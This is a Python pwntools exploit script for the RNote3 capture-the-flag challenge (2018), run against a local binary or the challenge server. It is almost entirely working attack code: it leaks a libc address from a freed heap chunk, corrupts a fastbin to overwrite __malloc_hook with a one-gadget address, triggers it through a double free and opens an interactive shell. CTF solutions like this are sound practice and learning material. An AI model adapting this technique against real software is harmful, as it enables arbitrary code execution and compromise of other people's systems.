#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Copyright © 2018 hzshang <hzshang15@gmail.com>

from pwn import *
context.log_level="debug"
pwn_file="./RNote3"
elf=ELF(pwn_file)
libc=elf.libc
if len(sys.argv)==1:
    conn=process(pwn_file)
    pid=conn.pid
else:
    conn=remote("rnote3.2018.teamrois.cn",7322)
    pid=0

def debug():
    log.debug("libc address:0x%x"%libc.address)
    log.debug("process pid:%d"%pid)
    pause()

def add(size,title,content):
    conn.sendline("1")
    conn.sendlineafter("please input title: ",title)
    conn.sendlineafter("please input content size: ",str(size))
    conn.sendlineafter("please input content: ",content)

def show(title):
    conn.sendline("2")
    conn.sendlineafter("please input note title: ",title)
    conn.recvuntil("note title: ")
    t=conn.recvline(keepends=False)
    conn.recvuntil("content: ")
    content=conn.recvline(keepends=False)
    return t,content

def dele(title):
    conn.sendline("4")
    conn.sendlineafter("please input note title: ",title)

def edit(title,content):
    conn.sendline("3")
    conn.sendlineafter("please input note title: ",title)
    conn.sendlineafter("please input new content: ",content)

add(0xa0,"a","h")
add(0x60,"b","h")
add(0x20,"c","h")


title,content=show("a")
dele("haha")

t,content=show("\x00"*8)
libc.address=u64(content.ljust(8,"\x00"))-0x3c4b78

add(0x60,"d","h")
dele("d")
edit("\x00",p64(libc.sym["__malloc_hook"]-0x13))

add(0x60,"d","h")
add(0x60,"a","a"*3+p64(libc.address+0xf02a4))

dele("d")
dele("\x00")

conn.interactive()














